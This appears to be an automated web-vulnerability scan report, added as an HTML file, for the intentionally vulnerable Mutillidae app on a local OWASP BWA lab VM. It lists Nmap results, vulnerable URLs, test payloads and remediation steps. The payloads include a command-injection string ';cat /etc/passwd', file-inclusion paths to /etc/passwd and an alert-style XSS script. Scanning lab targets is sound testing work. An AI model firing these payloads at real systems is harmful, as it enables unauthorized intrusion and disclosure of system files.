@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Vulnerability Report</title>
+</head>
+<body>
+<h3>Nmap Log:</h3>
+
+<p>Nmap Version: (7, 94)
+</p>
+<p>Nmap Command: nmap 192.168.232.135 -p 80 -v -sV -sC -T3
+</p>
+<p>Nmap Scan results:
+</p>
+<p>Host: 192.168.232.135
+</p>
+<p>Hostnames: 
+</p>
+<p>Port 80: open - http - Apache httpd 2.2.14
+</p>
+<p>HTTP Title: owaspbwa OWASP Broken Web Applications
+</p>
+<p>http-server-header: Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30 with Suhosin-Patch proxy_html/3.0.1 mod_python/3.3.1 Python/2.6.5 mod_ssl/2.2.14 OpenSSL/0.9.8k Phusion_Passenger/4.0.38 mod_perl/2.0.4 Perl/v5.10.1
+</p>
+<p>Product: Apache httpd
+</p>
+<p>Version: 2.2.14
+</p>
+<p>Extra Info: (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30 with Suhosin-Patch proxy_html/3.0.1 mod_python/3.3.1 Python/2.6.5 mod_ssl/2.2.14 OpenSSL/0.9.8k Phusion_Passenger/4.0.38 mod_perl/2.0.4 Perl/v5.10.1
+</p>
+<h2>Total URLs Visited: 166</h2>
+
+<h3>SQL Injection - 0 vulnerabilities found</h3>
+<br>
+<h3>Command Injection - 1 vulnerabilities found</h3>
+<p>Description: Command injection is an attack in which an attacker can execute arbitrary commands on the server. This can lead to unauthorized access, data leakage, and system compromise.</p>
+<ul>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=dns-lookup.php</p>	<p>&emsp;Payload: ;cat /etc/passwd</p>
+</li>
+</ul>
+<p>Remediation Steps:
+1. Use whitelisting to restrict the set of allowed commands and parameters.
+2. Implement proper input validation and sanitization to prevent command injection vulnerabilities.</p>
+<br>
+<h3>Reflected Cross Site Scripting - 9 vulnerabilities found</h3>
+<p>Description: Reflected Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts into a web application, which are then reflected back to the user's browser. This can lead to client-side code execution and various security risks.</p>
+<ul>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=user-info.php</p>	<p>&emsp;Payload: &lt;scrIpt&gt;alert(&#x27;XSS&#x27;)&lt;/sCriPt&gt;</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/?page=add-to-your-blog.php</p>	<p>&emsp;Payload: &lt;scrIpt&gt;alert(&#x27;XSS&#x27;)&lt;/sCriPt&gt;</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=add-to-your-blog.php</p>	<p>&emsp;Payload: &lt;scrIpt&gt;alert(&#x27;XSS&#x27;)&lt;/sCriPt&gt;</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=text-file-viewer.php</p>	<p>&emsp;Payload: &lt;scrIpt&gt;alert(&#x27;XSS&#x27;)&lt;/sCriPt&gt;</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=set-background-color.php</p>	<p>&emsp;Payload: &lt;scrIpt&gt;alert(&#x27;XSS&#x27;)&lt;/sCriPt&gt;</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=document-viewer.php&PathToDocument=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php</p>	<p>&emsp;Payload: &lt;scrIpt&gt;alert(&#x27;XSS&#x27;)&lt;/sCriPt&gt;</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=user-poll.php</p>	<p>&emsp;Payload: &lt;scrIpt&gt;alert(&#x27;XSS&#x27;)&lt;/sCriPt&gt;</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=source-viewer.php</p>	<p>&emsp;Payload: &lt;scrIpt&gt;alert(&#x27;XSS&#x27;)&lt;/sCriPt&gt;</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=client-side-control-challenge.php</p>	<p>&emsp;Payload: &lt;scrIpt&gt;alert(&#x27;XSS&#x27;)&lt;/sCriPt&gt;</p>
+</li>
+</ul>
+<p>Remediation Steps:
+1. Encode user input to prevent malicious scripts from executing.
+2. Implement Content Security Policy (CSP) headers to restrict the sources of executable scripts.</p>
+<br>
+<h3>Stored Cross Site Scripting - 0 vulnerabilities found</h3>
+<br>
+<h3>Remote File Inclusion - 12 vulnerabilities found</h3>
+<p>Description: Remote file inclusion (RFI) is an attack that allows an attacker to include remote files on a website. This can lead to the execution of arbitrary code and unauthorized access to server resources.</p>
+<ul>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=user-info.php</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=text-file-viewer.php</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=user-info-xpath.php</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=document-viewer.php&PathToDocument=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=user-poll.php</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=xml-validator.php</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=source-viewer.php</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/?page=text-file-viewer.php</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/?page=source-viewer.php</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=http://www.google.com</p>	<p>&emsp;Payload: www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=http%3A%2F%2Fwww.google.com%2F&popUpNotificationCode=http%3A%2F%2Fwww.google.com%2F</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/?page=http%3A%2F%2Fwww.google.com%2F</p>	<p>&emsp;Payload: http://www.google.com/</p>
+</li>
+</ul>
+<p>Remediation Steps:
+1. Avoid dynamically including remote files in web applications.
+2. Use allow list-based input validation to restrict the inclusion of files.</p>
+<br>
+<h3>Local File Inclusion - 11 vulnerabilities found</h3>
+<p>Description: Local file inclusion (LFI) is a type of vulnerability that allows an attacker to include files on a server through the web browser. This can lead to information disclosure and remote code execution.</p>
+<ul>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=user-info.php</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=text-file-viewer.php</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=user-info-xpath.php</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=document-viewer.php&PathToDocument=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=user-poll.php</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=xml-validator.php</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=source-viewer.php</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/?page=text-file-viewer.php</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/?page=source-viewer.php</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=%2Fetc%2Fpasswd&popUpNotificationCode=%2Fetc%2Fpasswd</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/?page=%2Fetc%2Fpasswd</p>	<p>&emsp;Payload: /etc/passwd</p>
+</li>
+</ul>
+<p>Remediation Steps:
+1. Avoid passing user-controlled input directly to file inclusion functions.
+2. Implement proper input validation and sanitize file paths to prevent LFI vulnerabilities.</p>
+<br>
+<h3>Verb Tampering - 0 vulnerabilities found</h3>
+<br>
+<h3>XML External Entity Injection - 1 vulnerabilities found</h3>
+<p>Description: No description available</p>
+<ul>
+<li>
+<p>URL: http://192.168.232.135:80/mutillidae/index.php?page=xml-validator.php</p>	<p>&emsp;Payload: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</p>
+</li>
+</ul>
+<p>Remediation Steps:
+No remediation available</p>
+<br>
+<h3>Server Side Template Injection - 0 vulnerabilities found</h3>
+<br>
+</body>
+</html>
